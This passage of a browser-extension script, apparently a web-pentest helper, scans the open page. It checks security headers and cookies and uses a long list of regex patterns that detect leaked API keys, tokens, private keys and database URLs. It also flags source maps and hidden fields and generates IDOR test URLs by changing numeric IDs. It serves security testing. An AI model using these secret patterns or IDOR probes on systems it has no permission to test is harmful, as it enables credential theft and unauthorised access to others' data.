        navigator.clipboard.writeText(`${param.name}=${payload}`);
        showToast('Copied: ' + param.name + '=' + payload.substring(0, 20) + '...');
    }
};

// Copy all payloads for parameter
window.copyAllPayloads = function (index) {
    const param = discoveredParameters[index];
    if (param) {
        const payloads = param.vulnType?.payloads || [param.vulnType?.payload || 'test'];
        const allUrls = payloads.map(p => `${param.name}=${p}`).join('\n');
        navigator.clipboard.writeText(allUrls);
        showToast('Copied ' + payloads.length + ' payloads for ' + param.name);
    }
};

async function sendParametersToArsenal() {
    if (!arsenalConnected) {
        showToast('Connect to Arsenal first');
        return;
    }

    if (discoveredParameters.length === 0) {
        showToast('No parameters to send. Scan first.');
        return;
    }

    try {
        const response = await fetch(`${ARSENAL_API}/api/import/parameters`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ parameters: discoveredParameters, source: 'extension' })
        });

        if (response.ok) {
            showToast(`Sent ${discoveredParameters.length} parameters to Arsenal!`);
        } else {
            showToast('Failed to send parameters');
        }
    } catch (e) {
        showToast('Connection error');
    }
}

// ===== SECURITY ANALYZER LOGIC =====
let securityResults = {
    headers: [],
    cookies: [],
    leaks: [],
    sourceMaps: [],
    hidden: [],
    idor: [],
    score: 0
};

function setupSecurityEvents() {
    document.getElementById('backFromSecurity')?.addEventListener('click', () => showScreen('tools'));
    document.getElementById('runSecurityScan')?.addEventListener('click', runSecurityScan);
    document.getElementById('exportSecurityReport')?.addEventListener('click', exportSecurityReport);
}

window.toggleSecuritySection = function (sectionId) {
    const section = document.getElementById(sectionId);
    if (section) {
        section.classList.toggle('hidden');
    }
};

let isSecurityScanning = false;

async function runSecurityScan() {
    if (isSecurityScanning) {
        showToast('Scan already in progress');
        return;
    }

    isSecurityScanning = true;
    showSecurityLoading(true);
    showToast('Running security scan...');

    try {
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        if (!tab?.url) {
            showToast('No active tab');
            showSecurityLoading(false);
            isSecurityScanning = false;
            return;
        }

        securityResults = { headers: [], cookies: [], leaks: [], sourceMaps: [], hidden: [], idor: [], score: 100 };

        // Run checks with small delays to keep UI responsive
        updateScanProgress('Checking headers...');
        await checkSecurityHeaders(tab.url);

        updateScanProgress('Scanning cookies...');
        await checkCookieSecurity(tab.id);

        updateScanProgress('Detecting leaks...');
        await scanForLeaks(tab.id);

        updateScanProgress('Finding source maps...');
        await findSourceMaps(tab.id);

        updateScanProgress('Checking hidden elements...');
        await findHiddenElements(tab.id);

        updateScanProgress('Detecting IDOR...');
        detectIDOR(tab.url);

        // Update UI
        updateSecurityUI();
        showSecurityLoading(false);
        isSecurityScanning = false;
        showToast(`Scan complete! Score: ${securityResults.score}/100`);

    } catch (e) {
        console.error('Security scan failed:', e);
        showSecurityLoading(false);
        isSecurityScanning = false;
        showToast('Scan failed: ' + e.message);
    }
}

function showSecurityLoading(show) {
    const scoreValue = document.getElementById('securityScoreValue');
    const scoreCircle = document.getElementById('securityScoreCircle');
    if (show) {
        if (scoreValue) scoreValue.innerHTML = '<span class="loading-spinner"></span>';
        if (scoreCircle) scoreCircle.classList.add('scanning');
    } else {
        if (scoreCircle) scoreCircle.classList.remove('scanning');
    }
}

function updateScanProgress(msg) {
    const progressEl = document.getElementById('scoreIssues');
    if (progressEl) progressEl.textContent = msg.substring(0, 15);
}

async function checkSecurityHeaders(url) {
    const requiredHeaders = [
        {
            name: 'content-security-policy',
            label: 'Content-Security-Policy',
            weight: 15,
            desc: 'Prevents XSS, clickjacking, and code injection',
            fix: "Add header: Content-Security-Policy: default-src 'self'"
        },
        {
            name: 'x-frame-options',
            label: 'X-Frame-Options',
            weight: 10,
            desc: 'Prevents clickjacking attacks via iframe embedding',
            fix: 'Add header: X-Frame-Options: DENY or SAMEORIGIN'
        },
        {
            name: 'x-content-type-options',
            label: 'X-Content-Type-Options',
            weight: 10,
            desc: 'Prevents MIME-type sniffing attacks',
            fix: 'Add header: X-Content-Type-Options: nosniff'
        },
        {
            name: 'strict-transport-security',
            label: 'Strict-Transport-Security',
            weight: 10,
            desc: 'Forces HTTPS, prevents downgrade attacks',
            fix: 'Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains'
        },
        {
            name: 'x-xss-protection',
            label: 'X-XSS-Protection',
            weight: 5,
            desc: 'Legacy XSS filter (deprecated but still useful)',
            fix: 'Add header: X-XSS-Protection: 1; mode=block'
        },
        {
            name: 'referrer-policy',
            label: 'Referrer-Policy',
            weight: 5,
            desc: 'Controls referrer information leakage',
            fix: 'Add header: Referrer-Policy: strict-origin-when-cross-origin'
        },
        {
            name: 'permissions-policy',
            label: 'Permissions-Policy',
            weight: 5,
            desc: 'Controls browser features (camera, mic, geolocation)',
            fix: 'Add header: Permissions-Policy: geolocation=(), camera=()'
        }
    ];

    try {
        const response = await chrome.runtime.sendMessage({ type: 'fetchHeaders', url });
        const headers = response?.headers || {};

        for (const h of requiredHeaders) {
            const present = !!headers[h.name];
            securityResults.headers.push({
                name: h.label,
                present,
                value: headers[h.name] || 'Missing',
                desc: h.desc,
                fix: h.fix
            });
            if (!present) securityResults.score -= h.weight;
        }

        // Check for info disclosure
        if (headers['x-powered-by']) {
            securityResults.headers.push({
                name: 'X-Powered-By (Info Leak)',
                present: true,
                value: headers['x-powered-by'],
                desc: 'Exposes server technology - helps attackers',
                fix: 'Remove X-Powered-By header from server config'
            });
            securityResults.score -= 5;
        }
        if (headers['server']) {
            securityResults.headers.push({
                name: 'Server Header',
                present: true,
                value: headers['server'],
                desc: 'Server version info exposure',
                fix: 'Hide or generalize Server header'
            });
        }
    } catch (e) {
        console.error('Header check failed:', e);
    }
}

async function checkCookieSecurity(tabId) {
    const result = await chrome.scripting.executeScript({
        target: { tabId },
        func: () => document.cookie
    });

    const cookieStr = result?.[0]?.result || '';
    const cookies = cookieStr.split(';').filter(c => c.trim());

    for (const cookie of cookies) {
        const [name] = cookie.split('=');
        // Check flags via headers would need Set-Cookie parsing
        securityResults.cookies.push({
            name: name?.trim() || 'Unknown',
            flags: 'Check Set-Cookie header for HttpOnly/Secure/SameSite'
        });
    }
}

async function scanForLeaks(tabId) {
    // More accurate patterns with specific prefixes to reduce false positives
    const patterns = [
        // Cloud Providers - AWS
        { type: 'AWS Access Key', regex: /\bAKIA[0-9A-Z]{16}\b/g, severity: 'critical' },
        { type: 'AWS Secret Key', regex: /aws.{0,20}secret.{0,20}['"][0-9a-zA-Z\/+=]{40}['"]/gi, severity: 'critical' },
        { type: 'AWS ARN', regex: /arn:aws:[a-z0-9-]+:[a-z0-9-]*:\d{12}:[a-zA-Z0-9\/_-]+/g, severity: 'medium' },

        // Google/Firebase
        { type: 'Google API Key', regex: /\bAIza[0-9A-Za-z_-]{35}\b/g, severity: 'high' },
        { type: 'Google OAuth Token', regex: /ya29\.[0-9A-Za-z_-]+/g, severity: 'high' },

        // Payment
        { type: 'Stripe Secret Key', regex: /\bsk_live_[0-9a-zA-Z]{24,}\b/g, severity: 'critical' },
        { type: 'Stripe Publishable', regex: /\bpk_live_[0-9a-zA-Z]{24,}\b/g, severity: 'medium' },
        { type: 'PayPal/Braintree', regex: /access_token\$production\$[a-z0-9]{16}\$[a-f0-9]{32}/gi, severity: 'critical' },
        { type: 'Square Access Token', regex: /\bsq0atp-[0-9A-Za-z_-]{22}\b/g, severity: 'critical' },

        // Version Control
        { type: 'GitHub Token', regex: /\bgh[pousr]_[A-Za-z0-9_]{36,255}\b/g, severity: 'critical' },
        { type: 'GitHub OAuth', regex: /\bgho_[A-Za-z0-9_]{36,}\b/g, severity: 'critical' },
        { type: 'GitLab Token', regex: /\bglpat-[0-9a-zA-Z_-]{20,}\b/g, severity: 'critical' },
        { type: 'Bitbucket Token', regex: /\bBBDC-[A-Za-z0-9]{32}\b/g, severity: 'critical' },

        // Communication
        { type: 'Slack Token', regex: /\bxox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}\b/g, severity: 'critical' },
        { type: 'Slack Webhook', regex: /https:\/\/hooks\.slack\.com\/services\/T[a-zA-Z0-9_]{8,}\/B[a-zA-Z0-9_]{8,}\/[a-zA-Z0-9_]{24}/g, severity: 'high' },
        { type: 'Discord Token', regex: /\b[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27}\b/g, severity: 'critical' },
        { type: 'Discord Webhook', regex: /https:\/\/discord(app)?\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+/g, severity: 'high' },
        { type: 'Telegram Bot Token', regex: /\b\d{8,10}:[A-Za-z0-9_-]{35}\b/g, severity: 'critical' },

        // AI/ML
        { type: 'OpenAI API Key', regex: /\bsk-[A-Za-z0-9]{48,}\b/g, severity: 'critical' },
        { type: 'Anthropic API Key', regex: /\bsk-ant-[A-Za-z0-9_-]{40,}\b/g, severity: 'critical' },
        { type: 'HuggingFace Token', regex: /\bhf_[A-Za-z0-9]{34,}\b/g, severity: 'high' },

        // Cloud Platforms
        { type: 'Heroku API Key', regex: /\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b/g, severity: 'medium' },
        { type: 'Azure Subscription', regex: /\b[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}\b/gi, severity: 'medium' },
        { type: 'Cloudflare API', regex: /\b[a-f0-9]{37}\b/g, severity: 'high' },
        { type: 'DigitalOcean Token', regex: /\bdop_v1_[a-f0-9]{64}\b/g, severity: 'critical' },

        // Email/SMS
        { type: 'Twilio API Key', regex: /\bSK[0-9a-fA-F]{32}\b/g, severity: 'critical' },
        { type: 'Twilio Account SID', regex: /\bAC[a-z0-9]{32}\b/gi, severity: 'high' },
        { type: 'Mailgun API Key', regex: /\bkey-[0-9a-zA-Z]{32}\b/g, severity: 'high' },
        { type: 'SendGrid API Key', regex: /\bSG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}\b/g, severity: 'critical' },

        // Package Managers
        { type: 'NPM Token', regex: /\bnpm_[A-Za-z0-9]{36}\b/g, severity: 'critical' },
        { type: 'PyPI Token', regex: /\bpypi-AgEIcHlwaS5vcmc[A-Za-z0-9_-]{50,}\b/g, severity: 'critical' },

        // Auth Tokens
        { type: 'JWT Token', regex: /\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/g, severity: 'high' },
        { type: 'Bearer Token', regex: /bearer\s+[a-zA-Z0-9_-]{20,}/gi, severity: 'high' },
        { type: 'Basic Auth', regex: /basic\s+[a-zA-Z0-9+\/=]{20,}/gi, severity: 'high' },

        // Secrets in Code
        { type: 'Private Key', regex: /-----BEGIN (RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY( BLOCK)?-----/g, severity: 'critical' },
        { type: 'Hardcoded Password', regex: /(password|passwd|pwd|secret)\s*[:=]\s*['"][^'"]{6,}['"]/gi, severity: 'critical' },
        { type: 'API Key Generic', regex: /(api[_-]?key|apikey)\s*[:=]\s*['"][a-zA-Z0-9_-]{16,}['"]/gi, severity: 'high' },

        // Database
        { type: 'MongoDB URL', regex: /mongodb(\+srv)?:\/\/[^\s'"<>]+/gi, severity: 'critical' },
        { type: 'PostgreSQL URL', regex: /postgres(ql)?:\/\/[^\s'"<>]+/gi, severity: 'critical' },
        { type: 'MySQL URL', regex: /mysql:\/\/[^\s'"<>]+/gi, severity: 'critical' },
        { type: 'Redis URL', regex: /redis:\/\/[^\s'"<>]+/gi, severity: 'high' },

        // Cloud Storage
        { type: 'S3 Bucket URL', regex: /https?:\/\/[a-z0-9.-]+\.s3[.-][a-z0-9-]+\.amazonaws\.com/gi, severity: 'medium' },
        { type: 'S3 Bucket Name', regex: /s3:\/\/[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]/gi, severity: 'medium' },

        // Network/Internal
        { type: 'Internal IP', regex: /\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b/g, severity: 'low' },

        // PII
        { type: 'Email Address', regex: /\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b/g, severity: 'low' }
    ];

    const result = await chrome.scripting.executeScript({
        target: { tabId },
        func: () => document.documentElement.outerHTML
    });

    const html = result?.[0]?.result || '';
    const foundTypes = new Set();

    for (const p of patterns) {
        const matches = html.match(p.regex) || [];
        for (const match of matches.slice(0, 2)) {
            // Avoid duplicate types
            const key = p.type + match.substring(0, 20);
            if (foundTypes.has(key)) continue;
            foundTypes.add(key);

            securityResults.leaks.push({
                type: p.type,
                value: match.substring(0, 50) + (match.length > 50 ? '...' : ''),
                severity: p.severity
            });

            // Score deduction based on severity
            if (p.severity === 'critical') securityResults.score -= 15;
            else if (p.severity === 'high') securityResults.score -= 10;
            else if (p.severity === 'medium') securityResults.score -= 5;
        }
    }
}

async function findSourceMaps(tabId) {
    const result = await chrome.scripting.executeScript({
        target: { tabId },
        func: () => {
            const maps = [];
            document.querySelectorAll('script[src]').forEach(s => {
                if (s.src.includes('.map') || s.textContent?.includes('sourceMappingURL')) {
                    maps.push(s.src);
                }
            });
            // Check inline scripts for sourceMappingURL
            document.querySelectorAll('script:not([src])').forEach(s => {
                const match = s.textContent?.match(/\/\/[#@]\s*sourceMappingURL=([^\s]+)/);
                if (match) maps.push(match[1]);
            });
            return maps;
        }
    });

    securityResults.sourceMaps = result?.[0]?.result || [];
    securityResults.score -= securityResults.sourceMaps.length * 5;
}

async function findHiddenElements(tabId) {
    const result = await chrome.scripting.executeScript({
        target: { tabId },
        func: () => {
            const hidden = [];
            // Hidden inputs with values
            document.querySelectorAll('input[type="hidden"]').forEach(el => {
                if (el.name && el.value) {
                    hidden.push({ type: 'hidden-input', name: el.name, value: el.value.substring(0, 30) });
                }
            });
            // Display:none forms
            document.querySelectorAll('form').forEach(form => {
                const style = window.getComputedStyle(form);
                if (style.display === 'none' || style.visibility === 'hidden') {
                    hidden.push({ type: 'hidden-form', action: form.action || 'no-action' });
                }
            });
            // Comments with potential sensitive info
            const walker = document.createTreeWalker(document, NodeFilter.SHOW_COMMENT);
            let node;
            while (node = walker.nextNode()) {
                const text = node.textContent.toLowerCase();
                if (text.includes('password') || text.includes('todo') || text.includes('fixme') || text.includes('debug')) {
                    hidden.push({ type: 'comment', value: node.textContent.substring(0, 50) });
                }
            }
            return hidden;
        }
    });

    securityResults.hidden = result?.[0]?.result || [];
}

function detectIDOR(url) {
    const idPatterns = [
        { regex: /\/users?\/(\d+)/i, type: 'User ID' },
        { regex: /\/accounts?\/(\d+)/i, type: 'Account ID' },
        { regex: /\/orders?\/(\d+)/i, type: 'Order ID' },
        { regex: /\/invoices?\/(\d+)/i, type: 'Invoice ID' },
        { regex: /\/documents?\/(\d+)/i, type: 'Document ID' },
        { regex: /[?&]id=(\d+)/i, type: 'Query ID' },
        { regex: /[?&]user_id=(\d+)/i, type: 'User ID Param' },
        { regex: /\/api\/v\d+\/[^\/]+\/(\d+)/i, type: 'API Resource ID' }
    ];

    for (const p of idPatterns) {
        const match = url.match(p.regex);
        if (match) {
            const id = parseInt(match[1]);
            securityResults.idor.push({
                type: p.type,
                original: url,
                tests: [
                    url.replace(match[1], '1'),
                    url.replace(match[1], String(id - 1)),
                    url.replace(match[1], String(id + 1)),
                    url.replace(match[1], '999999')
                ]
            });
        }
    }
}

function updateSecurityUI() {
    // Score
    const scoreEl = document.getElementById('securityScoreValue');
    const scoreCircle = document.getElementById('securityScoreCircle');
    if (scoreEl) scoreEl.textContent = Math.max(0, securityResults.score);
    if (scoreCircle) {
        scoreCircle.classList.remove('good', 'warning', 'danger');
        if (securityResults.score >= 80) scoreCircle.classList.add('good');
        else if (securityResults.score >= 50) scoreCircle.classList.add('warning');
        else scoreCircle.classList.add('danger');
    }

    // Stats
    document.getElementById('scoreHeaders').textContent = `${securityResults.headers.filter(h => h.present).length}/${securityResults.headers.length}`;
    document.getElementById('scoreCookies').textContent = securityResults.cookies.length;
    document.getElementById('scoreLeaks').textContent = securityResults.leaks.length;
    document.getElementById('scoreIssues').textContent = securityResults.hidden.length + securityResults.sourceMaps.length;

    // Headers
    document.getElementById('headersBadge').textContent = securityResults.headers.length;
    document.getElementById('headersSection').innerHTML = securityResults.headers.map(h => `
        <div class="security-item-full">
            <div class="security-item-row">
                <span class="name">${h.name}</span>
                <span class="status ${h.present ? (h.name.includes('Leak') ? 'warn' : 'pass') : 'fail'}">${h.present ? (h.name.includes('Leak') ? 'EXPOSED' : 'OK') : 'MISSING'}</span>
            </div>
            ${!h.present || h.name.includes('Leak') ? `
                <div class="security-item-desc">${h.desc || ''}</div>
                <div class="security-item-fix">${h.fix || ''}</div>
            ` : ''}
        </div>
    `).join('');

    // Cookies
    document.getElementById('cookiesBadge').textContent = securityResults.cookies.length;
    document.getElementById('cookiesSection').innerHTML = securityResults.cookies.map(c => `
        <div class="security-item"><span class="name">${c.name}</span></div>
    `).join('') || '<p style="color:var(--text-muted);font-size:11px;">No cookies found</p>';

    // Leaks
    const leaksBadge = document.getElementById('leaksBadge');
    leaksBadge.textContent = securityResults.leaks.length;
    if (securityResults.leaks.length > 0) leaksBadge.classList.add('danger');
    document.getElementById('leaksSection').innerHTML = securityResults.leaks.map(l => `
        <div class="leak-item" onclick="navigator.clipboard.writeText('${l.value}');showToast('Copied!')">
            <div class="leak-type">${l.type}</div>
            <div class="leak-value">${escapeHtml(l.value)}</div>
        </div>
    `).join('') || '<p style="color:var(--text-muted);font-size:11px;">No leaks detected ✅</p>';

    // Source Maps
    document.getElementById('sourceMapsBadge').textContent = securityResults.sourceMaps.length;
    document.getElementById('sourceMapsSection').innerHTML = securityResults.sourceMaps.map(m => `
        <div class="security-item"><span class="name">${m}</span><span class="status warn">EXPOSED</span></div>
    `).join('') || '<p style="color:var(--text-muted);font-size:11px;">No source maps found</p>';

    // Hidden
    document.getElementById('hiddenBadge').textContent = securityResults.hidden.length;
    document.getElementById('hiddenSection').innerHTML = securityResults.hidden.map(h => `
        <div class="security-item"><span class="name">${h.type}: ${h.name || h.action || h.value}</span></div>
    `).join('') || '<p style="color:var(--text-muted);font-size:11px;">No hidden elements found</p>';

    // IDOR
    document.getElementById('idorBadge').textContent = securityResults.idor.length;
    document.getElementById('idorSection').innerHTML = securityResults.idor.map(i => `
        <div class="security-item" style="flex-direction:column;align-items:flex-start;">
            <div class="leak-type">${i.type}</div>
            ${i.tests.map(t => `<div class="leak-value" onclick="window.open('${t}','_blank')" style="cursor:pointer;margin-top:2px;">${t}</div>`).join('')}
        </div>
    `).join('') || '<p style="color:var(--text-muted);font-size:11px;">No IDOR patterns detected</p>';
}

function exportSecurityReport() {
    if (securityResults.score === 0 && securityResults.headers.length === 0) {
        showToast('Run a scan first');
        return;
    }

    let report = `# LUHUT BINSHAR - Security Analysis Report\n`;
    report += `# Generated: ${new Date().toISOString()}\n`;
    report += `# Security Score: ${securityResults.score}/100\n\n`;

    report += `## SECURITY HEADERS\n`;
    securityResults.headers.forEach(h => {
        report += `${h.present ? '✅' : '❌'} ${h.name}: ${h.value}\n`;
    });

    report += `\n## COOKIES (${securityResults.cookies.length})\n`;
    securityResults.cookies.forEach(c => report += `- ${c.name}\n`);

    report += `\n## SENSITIVE DATA LEAKS (${securityResults.leaks.length})\n`;
    securityResults.leaks.forEach(l => report += `⚠️ ${l.type}: ${l.value}\n`);

    report += `\n## SOURCE MAPS (${securityResults.sourceMaps.length})\n`;
    securityResults.sourceMaps.forEach(m => report += `- ${m}\n`);

    report += `\n## HIDDEN ELEMENTS (${securityResults.hidden.length})\n`;
    securityResults.hidden.forEach(h => report += `- ${h.type}: ${h.name || h.value || h.action}\n`);

    report += `\n## IDOR TEST URLs\n`;
    securityResults.idor.forEach(i => {
        report += `\n### ${i.type}\n`;
        i.tests.forEach(t => report += `${t}\n`);
    });

    const blob = new Blob([report], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `security_report_${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);

    showToast('Security report exported!');
}
